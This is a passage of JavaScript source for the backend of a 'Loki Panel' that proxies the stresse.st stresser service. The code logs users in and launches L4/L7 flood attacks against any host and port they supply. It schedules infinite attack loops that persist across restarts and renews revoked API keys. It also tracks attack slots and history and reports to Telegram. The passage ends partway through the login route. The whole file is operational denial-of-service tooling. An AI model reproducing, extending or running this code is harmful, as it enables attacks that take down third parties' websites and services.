/**
 * Loki Panel Backend
 * stresse.st proxy + recon/check tools
 */

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const { wrapper } = require('axios-cookiejar-support');
const { CookieJar } = require('tough-cookie');
const net = require('net');
const dns = require('dns');
const fs = require('fs');
const path = require('path');
const { sendTelegram, initTelegram, esc } = require('./telegram');

initTelegram();

// Node 20'nin "Happy Eyeballs" (autoSelectFamily) ozelligi, IPv6'si bozuk/eksik
// sunucularda IPv6 denemesi sirasinda "read ECONNRESET" hatasina yol aciyor.
// Bu yuzden IPv4'u tercih edip autoSelectFamily'i kapatiyoruz.
if (typeof net.setDefaultAutoSelectFamily === 'function') {
  net.setDefaultAutoSelectFamily(false);
}
dns.setDefaultResultOrder('ipv4first');

// Beklenmedik promise rejection'lari yutma: logla ama process'i oldurme.
process.on('unhandledRejection', (err) => {
  console.error('[unhandledRejection]', err);
});

const app = express();
const PORT = process.env.PORT || 3001;

// Nginx gibi bir reverse proxy arkasında calisirken X-Forwarded-For'a given,
// ayni zamanda express-rate-limit uyarisini onler.
app.set('trust proxy', 1);

/**
 * CORS whitelist:
 * - Gelistirme ortamlari (localhost, 127.0.0.1 herhangi port)
 * - LOKI_ALLOWED_ORIGINS env degiskeni ile virgulle ayrilmis domainler
 * Ornek: LOKI_ALLOWED_ORIGINS=https://panel.site.com,https://app.site.com
 */
function getAllowedOrigins() {
  const defaults = [
    /^https?:\/\/localhost(:\d+)?$/,
    /^https?:\/\/127\.0\.0\.1(:\d+)?$/
  ];
  const envOrigins = (process.env.LOKI_ALLOWED_ORIGINS || '')
    .split(',')
    .map((o) => o.trim())
    .filter(Boolean);
  return { defaults, envOrigins };
}

function isOriginAllowed(origin) {
  // Bazı proxy/geliştirme durumlarında origin undefined gelebilir; bu durumda izin ver.
  if (!origin || origin === 'undefined' || origin === 'null') return true;
  const { defaults, envOrigins } = getAllowedOrigins();
  if (defaults.some((re) => re.test(origin))) return true;
  if (envOrigins.includes(origin)) return true;
  return false;
}

app.use(cors({
  origin: (origin, callback) => {
    if (isOriginAllowed(origin)) {
      callback(null, origin);
    } else {
      callback(new Error(`CORS policy: origin '${origin}' not allowed`));
    }
  },
  credentials: true,
  exposedHeaders: ['sessionId', 'content-type']
}));
app.use(express.json());

// Rate limiting: frontend polling (loop list + ongoing + history) dakikada
// 60+ istek atabildigi icin limiti yukseltiyoruz.
const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 500,
  message: { status: 'error', message: 'Too many requests' }
});
app.use('/api', limiter);

// In-memory session store: { sessionId: { jar: CookieJar, username } }
const sessions = {};

// Active loop registry: { loopId: { running, params, startedAt, lastRoundAt, roundCount, errors, roundAttackIds } }
const activeLoops = {};

// Global loop scheduler: her loop bagimsiz calisir. Ayni loopId'den ayni anda
// sadece 1 tur calisir.
let loopQueue = [];
let isProcessingLoopQueue = false;
const activeLoopRounds = new Set();

// Active normal attacks registry: { attackId: { username, host, port, method, time, startedAt, expiresAt } }
const activeAttacks = {};

// Basit upstream cache'leri: upstream yavas/hata verdiginde bayat veriyle idare et.
// methods herkes icin ayni (global, TTL 1 saat); plan kullanici bazli (TTL 5 dk).
const METHODS_CACHE_TTL_MS = 60 * 60 * 1000;
const PLAN_CACHE_TTL_MS = 5 * 60 * 1000;
const methodsCache = { data: null, fetchedAt: 0 };
const planCache = new Map(); // username -> { data, fetchedAt }

// Upstream istegini 1 kez retry'la dener: ilk deneme hata/timeout verirse
// 2sn bekleyip ikinci denemeyi yapar. Ikinci deneme de patlarsa hata firlatir.
async function fetchWithRetry(fn, label) {
  try {
    return await fn();
  } catch (err) {
    console.warn(`[retry] ${label} ilk deneme basarisiz (${err.message}), 2sn sonra tekrar deneniyor`);
    await new Promise((r) => setTimeout(r, 2000));
    return fn();
  }
}

// Attack history registry: { historyId: { username, target, port, method, time, concurrents, loop, status, startedAt, endedAt } }
const attackHistory = {};

// Persistence: save/restore sessions, loops, attacks and history across restarts
const DATA_DIR = path.join(__dirname, 'data');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');
const LOOPS_FILE = path.join(DATA_DIR, 'active-loops.json');
const ATTACKS_FILE = path.join(DATA_DIR, 'active-attacks.json');
const HISTORY_FILE = path.join(DATA_DIR, 'attack-history.json');
const API_TOKEN_FILE = path.join(DATA_DIR, 'api-token.txt');

function getFallbackApiToken() {
  try {
    if (fs.existsSync(API_TOKEN_FILE)) {
      return fs.readFileSync(API_TOKEN_FILE, 'utf8').trim();
    }
  } catch (err) {
    console.error('[apiToken] Fallback token okunamadi:', err.message);
  }
  return '';
}

// stresse.st'te API key yenilenirse (Generate Token) eski key 401 dondurur.
// Web oturumu (cookie) uzerinden guncel key'i cekip session'a ve fallback
// dosyasina yazar; boylece loop'lar key yenilenmesinde olmez.
async function refreshApiToken(sessionId) {
  try {
    const client = getClient(sessionId);
    const tokenRes = await client.get('/getApiToken');
    const apiToken = tokenRes.data?.apitoken || tokenRes.data?.token || tokenRes.data?.apiToken || null;
    if (!apiToken) return null;
    sessions[sessionId].apiToken = apiToken;
    try {
      fs.writeFileSync(API_TOKEN_FILE, apiToken);
    } catch (writeErr) {
      console.warn('[apiToken] Fallback dosyasi yazilamadi:', writeErr.message);
    }
    saveState();
    console.log(`[apiToken] Guncel API token yenilendi: ${apiToken.slice(0, 8)}...`);
    return apiToken;
  } catch (err) {
    console.warn(`[apiToken] Token yenileme basarisiz: ${err.message}`);
    return null;
  }
}

let saveStateRunning = false;
let saveStatePending = false;

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
}

function safeWriteJson(filePath, data) {
  try {
    const tmp = `${filePath}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
    fs.renameSync(tmp, filePath);
    // Sadece sahibin okuyabilecegi izinler (deploy ortaminda onemli)
    try {
      fs.chmodSync(filePath, 0o600);
    } catch (chmodErr) {
      // Windows gibi platformlarda chmod desteklenmeyebilir, gormezden gel
    }
  } catch (err) {
    console.error(`[persistence] Failed to write ${filePath}:`, err.message);
  }
}

function saveState() {
  if (saveStateRunning) {
    saveStatePending = true;
    return;
  }
  saveStateRunning = true;

  try {
    ensureDataDir();

    // Save sessions: serialize CookieJar to JSON
    const sessionsToSave = {};
    Object.entries(sessions).forEach(([sessionId, session]) => {
      try {
        sessionsToSave[sessionId] = {
          username: session.username,
          user: session.user,
          plan: session.plan,
          apiToken: session.apiToken || null,
          createdAt: session.createdAt,
          jar: session.jar.toJSON()
        };
      } catch (err) {
        console.error(`[persistence] Failed to serialize session ${sessionId}:`, err.message);
      }
    });
    safeWriteJson(SESSIONS_FILE, sessionsToSave);

    // Save loops: only serializable fields
    safeWriteJson(LOOPS_FILE, activeLoops);

    // Save normal attacks
    safeWriteJson(ATTACKS_FILE, activeAttacks);

    // Save attack history
    safeWriteJson(HISTORY_FILE, attackHistory);

    cleanupOldSessions();
  } finally {
    saveStateRunning = false;
    if (saveStatePending) {
      saveStatePending = false;
      setImmediate(saveState);
    }
  }
}

function loadState() {
  ensureDataDir();

  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const raw = fs.readFileSync(SESSIONS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([sessionId, data]) => {
        try {
          sessions[sessionId] = {
            username: data.username,
            user: data.user,
            plan: data.plan,
            apiToken: data.apiToken || null,
            createdAt: data.createdAt || new Date().toISOString(),
            jar: CookieJar.fromJSON(data.jar)
          };
        } catch (err) {
          console.error(`[persistence] Failed to restore session ${sessionId}:`, err.message);
        }
      });
      console.log(`[persistence] Restored ${Object.keys(sessions).length} session(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load sessions:', err.message);
    try {
      fs.renameSync(SESSIONS_FILE, `${SESSIONS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt sessions file:', renameErr.message);
    }
  }

  try {
    if (fs.existsSync(LOOPS_FILE)) {
      const raw = fs.readFileSync(LOOPS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([loopId, loop]) => {
        // Eski formattaki loop'lari at: URL protokolu iceren host, buyuk harfli method,
        // veya schemaVersion olmayan kayitlar. Bu loop'lar yeni kodla calismaz ve
        // sonsuz hata uretirler.
        const host = loop.params?.host || '';
        const method = loop.params?.method || '';
        const isOldFormat =
          /^https?:\/\//i.test(host) ||
          method !== method.toLowerCase() ||
          !loop.schemaVersion;
        if (isOldFormat) {
          console.log(`[persistence] Eski format loop atildi: ${loopId}`);
          return;
        }
        // Only restore infinite loops; finite loops with at least one round are considered done
        if (loop.params?.infinite && loop.running !== false) {
          activeLoops[loopId] = { ...loop, running: true, roundAttackIds: [] };
        }
      });
      console.log(`[persistence] Restored ${Object.keys(activeLoops).length} infinite loop(s)`);

      // Geri yuklenen loop'larin motorunu tekrar calistir
      Object.keys(activeLoops).forEach((loopId) => {
        console.log(`[persistence] Restarting loop ${loopId}`);
        runLoop(loopId).catch((err) => console.error(`[persistence] runLoop ${loopId} hatasi:`, err));
      });
    }
  } catch (err) {
    console.error('[persistence] Failed to load loops:', err.message);
    try {
      fs.renameSync(LOOPS_FILE, `${LOOPS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt loops file:', renameErr.message);
    }
  }

  cleanupOldSessions();

  // Restore normal attacks
  try {
    if (fs.existsSync(ATTACKS_FILE)) {
      const raw = fs.readFileSync(ATTACKS_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([attackId, attack]) => {
        // Sadece gecerli session'a sahip saldirilari geri yukle
        if (attack && sessions[attack.sessionId]) {
          activeAttacks[attackId] = attack;
        }
      });
      console.log(`[persistence] Restored ${Object.keys(activeAttacks).length} attack(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attacks:', err.message);
    try {
      fs.renameSync(ATTACKS_FILE, `${ATTACKS_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt attacks file:', renameErr.message);
    }
  }

  cleanupExpiredAttacks();

  // Restore attack history
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      const raw = fs.readFileSync(HISTORY_FILE, 'utf8');
      const parsed = JSON.parse(raw);
      Object.entries(parsed).forEach(([historyId, record]) => {
        if (record && record.username) {
          attackHistory[historyId] = record;
        }
      });
      console.log(`[persistence] Restored ${Object.keys(attackHistory).length} history record(s)`);
    }
  } catch (err) {
    console.error('[persistence] Failed to load attack history:', err.message);
    try {
      fs.renameSync(HISTORY_FILE, `${HISTORY_FILE}.corrupt.${Date.now()}`);
    } catch (renameErr) {
      console.error('[persistence] Failed to backup corrupt history file:', renameErr.message);
    }
  }

  cleanupOldHistory();
}

// Auto-save every 30 seconds
setInterval(saveState, 30000);

function buildTargetUrl(host, port) {
  if (!host) return '';
  const cleanHost = host.trim().replace(/\/$/, '');
  if (!cleanHost) return '';
  // Zaten URL ise portu URL API ile birlestir
  if (/^https?:\/\//i.test(cleanHost)) {
    try {
      const url = new URL(cleanHost);
      if (port && parseInt(port) > 0) url.port = String(port);
      return url.toString().replace(/\/$/, '');
    } catch {
      return port ? `${cleanHost}:${port}` : cleanHost;
    }
  }
  return port ? `${cleanHost}:${port}` : cleanHost;
}

async function stopAttackApi(apiClient, apiToken, attackId) {
  const url = `https://stresse.st/stop?id=${encodeURIComponent(attackId)}&key=${encodeURIComponent(apiToken)}`;
  const res = await apiClient.get(url);
  return res.data;
}

function buildApiUrl(apiToken, params) {
  const isL7 = params.layer === 'L7';
  const bareHost = normalizeHost(params.host);
  const host = isL7 ? `https://${bareHost}` : bareHost;
  const geo = params.geo || 'worldwide';
  const method = String(params.method || '');
  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} time=${params.time} geo=${geo} conc=${params.concurrents || 1}`);
  return url;
}

async function startAttackApi(apiClient, params) {
  const url = buildApiUrl(params.apiToken, params);
  // stresse.st'in /api ucu yuk altinda (ozellikle L7 methodlarda da) 15sn'yi
  // asabiliyor; timeout turu olduruyor. L4/L7 icin esit, genis timeout ver.
  const timeout = 60000;
  try {
    const res = await apiClient.get(url, { timeout });
    console.log(`[startAttackApi] status=${res.status} data=${JSON.stringify(res.data).slice(0, 400)}`);
    if (res.data?.status === 'error') {
      throw new Error(res.data.message || 'API attack failed');
    }
    return res.data;
  } catch (err) {
    if (err.response) {
      console.error(`[startAttackApi] HTTP ${err.response.status} error:`, JSON.stringify(err.response.data).slice(0, 400));
    } else {
      console.error(`[startAttackApi] request error:`, err.message);
    }
    throw err;
  }
}

async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
  const session = sessions[sessionId];
  if (!session || !session.apiToken) {
    throw new Error('API token not available');
  }

  // Once /ongoing'den mevcut ID'leri al.
  const beforeIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));

  // Tek istekte istenen concurrents kadar saldiri baslat.
  // Istegin baslangic zamanini tut; timeout kurtarmasinda sadece bu istekten
  // SONRA baslamis saldirilari kurtar (baska kullanicininkileri degil).
  const requestStartedAt = Date.now();
  let data;
  try {
    data = await startAttackApi(getApiClient(sessionId), {
      apiToken: session.apiToken,
      ...params,
      concurrents
    });
  } catch (err) {
    // API key stresse.st'te yenilenmisse (Generate Token) eski key 401 verir.
    // Web oturumu uzerinden guncel key'i cekip launch'i bir kez tekrarla.
    if (err.response?.status === 401) {
      console.warn(`[launchAttacksGet] 401 (Invalid API key); guncel token cekilip tekrar denenecek...`);
      const freshToken = await refreshApiToken(sessionId);
      if (!freshToken) {
        console.error(`[launchAttacksGet] GET /api hata:`, err.message);
        throw err;
      }
      data = await startAttackApi(getApiClient(sessionId), {
        apiToken: freshToken,
        ...params,
        concurrents
      });
    } else if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
      // Timeout'ta istek bizden dustu ama stresse.st saldirilari baslatmis olabilir.
      // /ongoing uzerinden yeni ID'leri kurtarmayi dene; yoksa gercek hata say.
      console.warn(`[launchAttacksGet] GET /api timeout; /ongoing'den kurtarma deneniyor...`);
      await new Promise((r) => setTimeout(r, 4000));
      const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
      const recovered = [...salvageIds].filter((id) => !beforeIds.has(id)).slice(0, concurrents);
      if (recovered.length > 0) {
        console.log(`[launchAttacksGet] timeout'a ragmen ${recovered.length} saldiri kurtarildi`);
        return {
          data: { status: 'success', recovered: true },
          attackIds: recovered,
          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
        };
      }
      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
      throw err;
    } else {
      console.error(`[launchAttacksGet] GET /api hata:`, err.message);
      throw err;
    }
  }

  // API response'undaki attack_id'leri al.
  let responseIds = [];
  if (Array.isArray(data?.attack_id)) {
    responseIds = data.attack_id;
  } else if (data?.attack_id) {
    responseIds = [data.attack_id];
  } else if (data?.id) {
    responseIds = [data.id];
  }

  // Ongoing listesinin guncellenmesi icin kisa bekle.
  await new Promise((r) => setTimeout(r, 4000));

  // Sadece bu istekten SONRA baslamis saldirilari aday goster; aksi halde ayni
  // host+method'a tur atan loop'larin ID'leri bu launch'a yanlislikla yazilir.
  const afterIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));

  // Onceki /ongoing'de olmayan ve baska bir launch/loop'a zaten kayitli olmayan
  // yeni ID'leri tespit et.
  let newIds = responseIds.filter((id) => !beforeIds.has(id) && !activeAttacks[id]);

  // Eger response'taki ID'lerin hepsi eskiyse (tum aktifler listesi ise),
  // after - before diff'inden yeni ID'leri cikar.
  if (newIds.length === 0 && afterIds.size > beforeIds.size) {
    newIds = [...afterIds].filter((id) => !beforeIds.has(id) && !activeAttacks[id]);
  }

  console.log(`[launchAttacksGet] before=${beforeIds.size} responseIds=${responseIds.length} after=${afterIds.size} new=${newIds.length} requested=${concurrents}`);

  if (newIds.length === 0) {
    // Mevcut akis aynen kalir (tekil /attack status:'error' doner, loop turu hata
    // sayar); burada sadece sebebi net bir log satiriyla belirtiyoruz.
    console.warn(`[launchAttacksGet] yeni ID dogrulanamadi (muhtemel upstream ret veya baska launch'a ait ID'ler elendi): host=${params.host} method=${params.method}`);
  }

  return {
    data,
    attackIds: newIds.slice(0, concurrents),
    elapsedSec: 0
  };
}

// Telegram: saldiri slot takibi. Sadece 1->0 gecisinde ve hic calisan loop
// yokken bir kez bildirim gonderir (loop turlari arasinda slot gecici olarak
// 0 gorunebilir, bu durumda bildirim atilmaz).
let lastAttackCount = 0;

// Telegram mesajlari icin Istanbul saatiyle okunabilir zaman damgasi.
function telegramTimestamp() {
  return new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul', hour12: false });
}

function checkSlotsEmpty() {
  const count = Object.keys(activeAttacks).length;
  const hadAttacks = lastAttackCount > 0;
  lastAttackCount = count;
  if (count !== 0 || !hadAttacks) return;
  const anyLoopRunning = Object.values(activeLoops).some((l) => l.running);
  if (anyLoopRunning) return;
  const message = [
    '🟡 <b>LOKI — SLOT UYARISI</b>',
    '─────────────────',
    '⚠️ Aktif saldırı kalmadı, tüm slotlar boş.',
    `🕐 <i>${telegramTimestamp()}</i>`
  ].join('\n');
  sendTelegram(message).catch(() => {});
}

// Loop kaldirildiginda Telegram bildirimi gonderir (fire-and-forget).
// action: 'durduruldu' (manuel stop) veya 'tamamlandi' (dogal bitis).
function notifyLoopRemoved(loop, action) {
  if (!loop) return;
  // Hedef portsuz gosterilir; L7 ise history formatiyla ayni sekilde https://host/
  const host = loop.params?.host || loop.displayTarget || 'bilinmiyor';
  const target = loop.params?.layer === 'L7' ? `https://${host}/` : host;
  const method = (loop.params?.method || 'BİLİNMİYOR').toUpperCase();
  const concurrents = loop.params?.concurrents ?? '?';
  const isStopped = action === 'durduruldu';
  const title = isStopped ? '🔴 <b>LOKI — LOOP DURDURULDU</b>' : '🟢 <b>LOKI — LOOP TAMAMLANDI</b>';
  const message = [
    title,
    '─────────────────',
    `🎯 <b>Hedef:</b> <code>${esc(target)}</code>`,
    `⚡ <b>Method:</b> <code>${esc(method)}</code>`,
    `🔁 <b>Concurrents:</b> <code>${esc(concurrents)}</code>`,
    `🕐 <i>${telegramTimestamp()}</i>`
  ].join('\n');
  sendTelegram(message).catch(() => {});
}

function registerAttack(attackId, sessionId, params, loopId = null, concurrents = 1, elapsedSec = 0) {
  if (!attackId || !sessionId) return;
  // Idempotency: ayni ID baska bir launch/loop tarafindan zaten kayitliysa
  // uzerine yazma (ortak panelde diff'ler cakisabilir).
  if (activeAttacks[attackId]) return;
  // Kurtarma (salvage) yolunda saldiri istegi gonderileli elapsedSec gecti;
  // expiresAt'i bu kadar kisalt ki saldiri erken silinmesin/gec silinmesin.
  const remainingSec = Math.max(1, (parseInt(params.time) || 0) - (parseInt(elapsedSec) || 0));
  activeAttacks[attackId] = {
    attackId,
    sessionId,
    username: sessions[sessionId]?.username,
    host: params.host,
    port: params.port,
    method: params.method,
    layer: params.layer || 'L4',
    time: parseInt(params.time) || 0,
    concurrents: parseInt(concurrents) || 1,
    loopId: loopId || null,
    startedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + remainingSec * 1000).toISOString()
  };
  lastAttackCount = Object.keys(activeAttacks).length;
  saveState();
}

function unregisterAttack(attackId) {
  if (!attackId) return;
  delete activeAttacks[attackId];
  saveState();
  checkSlotsEmpty();
}

function cleanupExpiredAttacks() {
  const now = Date.now();
  let removed = 0;
  const completedHistories = new Set();

  // 1) Aktif saldirilari temizle ve ilgili history'leri tamamlandi olarak isaretle.
  Object.entries(activeAttacks).forEach(([attackId, attack]) => {
    const expires = new Date(attack.expiresAt || 0).getTime();
    // 30 saniye tolerans: stresse.t gecikmeli baslatabilir veya bitirebilir.
    if (now - expires > 30 * 1000) {
      const loopId = attack.loopId;
      delete activeAttacks[attackId];
      removed++;

      if (loopId) {
        // Eger bu saldiri bir loop'a aitse ve loop artik aktif degilse,
        // o loop'a ait baska aktif saldiri kalmadiginda loop history'sini tamamlandi olarak isaretle.
        if (!activeLoops[loopId]) {
          const stillActive = Object.values(activeAttacks).some(
            (a) => a.loopId === loopId
          );
          if (!stillActive) {
            const historyId = `hist_loop_${loopId}`;
            if (attackHistory[historyId] && attackHistory[historyId].status === 'active') {
              completedHistories.add(historyId);
            }
          }
        }
      } else {
        // Normal (loopsuz) saldiri: history'yi tamamlandi olarak isaretle
        const history = findActiveHistoryByAttackId(attackId);
        if (history && history.status === 'active') {
          completedHistories.add(history.historyId);
        }
      }
    }
  });

  // 2) activeAttacks'te kalmamis ama attackHistory'de hala active olan expired kayitlari da temizle.
  Object.entries(attackHistory).forEach(([historyId, history]) => {
    if (history.status !== 'active') return;
    // Loop'a ait kayitlar: loop hala calisiyorsa completed yapma;
    // loop bitince cleanupLoop / 1. faz isaretler. expiresAt sadece ilk turun suresini tasir.
    if (history.loop && Object.values(activeLoops).some((l) => l.running && l.historyId === historyId)) {
      return;
    }
    const expires = new Date(history.expiresAt || 0).getTime();
    if (now - expires > 30 * 1000) {
      completedHistories.add(historyId);
    }
  });

  completedHistories.forEach((historyId) => {
    updateAttackHistoryStatus(historyId, 'completed');
    console.log(`[cleanup] History completed: ${historyId}`);
  });

  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired attack(s)`);
    checkSlotsEmpty();
  }
}

// Expired attacks cleanup every 60 seconds
setInterval(cleanupExpiredAttacks, 60000);

function addAttackHistory(sessionId, params, options = {}) {
  if (!sessionId) return;
  const username = sessions[sessionId]?.username;
  if (!username) return;

  const historyId = options.historyId || `hist_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  const now = new Date();
  const bareHost = normalizeHost(params.host);
  const isL7 = params.layer === 'L7';
  // Gecmiste hedefi L7 icin https://host/, L4 icin host:port olarak goster
  const target = isL7 ? `https://${bareHost}/` : (params.port ? `${bareHost}:${params.port}` : bareHost);
  attackHistory[historyId] = {
    historyId,
    username,
    target,
    port: params.port || null,
    method: params.method,
    layer: params.layer || 'L4',
    time: parseInt(params.time) || 0,
    concurrents: parseInt(options.concurrents) || parseInt(params.concurrents) || 1,
    loop: !!options.loop,
    status: 'active',
    startedAt: now.toISOString(),
    expiresAt: new Date(now.getTime() + (parseInt(params.time) || 0) * 1000).toISOString(),
    endedAt: null,
    attackIds: options.attackIds || []
  };
  saveState();
  return historyId;
}

function updateAttackHistoryStatus(historyId, status) {
  if (!historyId || !attackHistory[historyId]) return;
  attackHistory[historyId].status = status;
  attackHistory[historyId].endedAt = new Date().toISOString();
  saveState();
}

function findActiveHistoryByAttackId(attackId) {
  return Object.values(attackHistory).find(
    (h) => h.status === 'active' && h.attackIds.includes(attackId)
  );
}

const HISTORY_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000; // 7 gun

function cleanupOldHistory() {
  const now = Date.now();
  let removed = 0;
  Object.entries(attackHistory).forEach(([historyId, record]) => {
    const started = new Date(record.startedAt || 0).getTime();
    if (now - started > HISTORY_MAX_AGE_MS) {
      delete attackHistory[historyId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} old history record(s)`);
  }
}

// Old history cleanup every hour
setInterval(cleanupOldHistory, 60 * 60 * 1000);

function getSessionPlan(sessionId) {
  return sessions[sessionId]?.plan || {};
}

function handleEndpointError(res, error, label) {
  if (error.statusCode) {
    return res.status(error.statusCode).json({ status: 'error', message: error.message });
  }
  if (error.response) {
    return res.status(error.response.status).json({
      status: 'error',
      message: error.response.data?.message || error.message,
      data: error.response.data
    });
  }
  console.error(`${label}:`, error.message);
  res.status(500).json({ status: 'error', message: error.message });
}

function checkPlanLimits(sessionId, time, concurrents) {
  const plan = getSessionPlan(sessionId);
  const maxTime = plan.MaxTime || plan.attackTime || 86400;
  const maxConcurrents = plan.Concurrents || plan.concurrents || 80;

  if (parseInt(time) > parseInt(maxTime)) {
    return { ok: false, message: `Maksimum sure ${maxTime} saniye olabilir` };
  }
  if (parseInt(concurrents) > parseInt(maxConcurrents)) {
    return { ok: false, message: `Maksimum concurrent ${maxConcurrents} olabilir` };
  }

  // Mevcut aktif saldirilarin toplam concurrents'ini hesapla.
  // ID'siz saldirilar icin pending kayitlar da dahil.
  const currentConcurrents = Object.values(activeAttacks)
    .filter((a) => a.sessionId === sessionId)
    .reduce((sum, a) => sum + (parseInt(a.concurrents) || 1), 0);

  if (currentConcurrents + parseInt(concurrents) > parseInt(maxConcurrents)) {
    return {
      ok: false,
      message: `Mevcut ${currentConcurrents} aktif saldiri var. Maksimum toplam ${maxConcurrents} concurrent. Kalan: ${Math.max(0, maxConcurrents - currentConcurrents)}`
    };
  }

  return { ok: true };
}

const SESSION_MAX_AGE_MS = 24 * 60 * 60 * 1000; // 24 saat (son aktiviteden itibaren)

function cleanupOldSessions() {
  const now = Date.now();
  let removed = 0;
  Object.entries(sessions).forEach(([sessionId, session]) => {
    // Calisan loop'u olan session asla silinmez; aksi halde loop token'suz olur.
    const hasRunningLoop = Object.values(activeLoops).some(
      (l) => l.running && l.sessionId === sessionId
    );
    if (hasRunningLoop) return;
    // Kayar sures: son aktiviteye gore degerlendir (aktif oturum silinmez).
    const lastActivity = new Date(session.lastActivity || session.createdAt || 0).getTime();
    if (now - lastActivity > SESSION_MAX_AGE_MS) {
      delete sessions[sessionId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired session(s)`);
  }
}

/**
 * L4 host degerini normalize eder:
 * - URL protokolunu kaldirir (https://, http://)
 * - Icindeki port bilgisini kaldirir (host:443 -> host)
 * - Sonu / ile bitiyorsa kaldirir
 * Boylece disaridan verilen port ile cakisma olmaz.
 */
function normalizeHost(host) {
  if (!host || typeof host !== 'string') return '';
  let h = host.trim();
  // Protokol, path, query, fragment, port ve www. prefix'ini kaldir.
  h = h.replace(/^https?:\/\//i, '');
  h = h.replace(/^www\./i, '');
  h = h.split('/')[0];
  h = h.split('?')[0];
  h = h.split('#')[0];
  h = h.replace(/:\d+$/, '');
  return h.toLowerCase();
}

/**
 * Method bazli minimum atak suresi (saniye).
 * HTTP-TEMPESTA 200 sn; diger L7 methodlar 60 sn; L4 methodlar 60 sn.
 */
const METHOD_MIN_TIME = {
  'HTTP-TEMPESTA': 200
};
const L7_MIN_TIME = 60;
const L4_MIN_TIME = 60;

function getMinTime(method, layer) {
  if (METHOD_MIN_TIME[method?.toUpperCase()]) return METHOD_MIN_TIME[method.toUpperCase()];
  if (layer === 'L7') return L7_MIN_TIME;
  return L4_MIN_TIME;
}

function isFreeMethod(method) {
  return typeof method === 'string' && method.toUpperCase().startsWith('FREE-');
}

function getJar(sessionId) {
  if (!sessions[sessionId]) {
    return null;
  }
  return sessions[sessionId].jar;
}

function getClient(sessionId) {
  const jar = getJar(sessionId);
  if (!jar) {
    const err = new Error('Invalid or expired session');
    err.statusCode = 401;
    throw err;
  }
  // Kayar session suresi: aktif kullanim TTL'i yeniler.
  sessions[sessionId].lastActivity = new Date().toISOString();
  return wrapper(axios.create({
    baseURL: 'https://stresse.st',
    jar,
    withCredentials: true,
    family: 4,
    maxRedirects: 5,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': 'https://stresse.st',
      'Referer': 'https://stresse.st/hub'
    },
    timeout: 15000
  }));
}

function getApiClient(sessionId) {
  const session = sessions[sessionId];
  if (!session || !session.apiToken) {
    const err = new Error('API token not available');
    err.statusCode = 401;
    throw err;
  }
  return axios.create({
    baseURL: 'https://stresse.st',
    family: 4,
    maxRedirects: 5,
    timeout: 45000,
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    }
  });
}

// =====================
// stresse.st PROXY
// =====================

/**
 * POST /api/stresse/login
 * Body: { username, password }
 */
app.post('/api/stresse/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

      const sessionId = `sess_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
      sessions[sessionId] = { jar: new CookieJar(), username: null, createdAt: new Date().toISOString() };
      const client = getClient(sessionId);

      let step = 'GET /login';
    try {
      // 1. Get login page to collect cookies (retry ile)
      let loginPageOk = false;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          await client.get('/login');
          loginPageOk = true;
          break;
        } catch (retryErr) {
          console.warn(`[login] GET /login deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }
      if (!loginPageOk) throw new Error('Login sayfasi alinamadi');

      // 2. Submit login credentials (retry ile)
      step = 'POST /login';
      let loginRes;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          loginRes = await client.post('/login', { username, password });
          break;
        } catch (retryErr) {
          console.warn(`[login] POST /login deneme ${attempt}/3 hata: ${retryErr.message}`);
          if (attempt === 3) throw retryErr;
          await new Promise((r) => setTimeout(r, 1000));
        }
      }

      // 3. Verify session (retry ile)
      step = 'GET /vcookie';
      let vcookieRes;
      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          vcookieRes = await client.get('/vcookie');
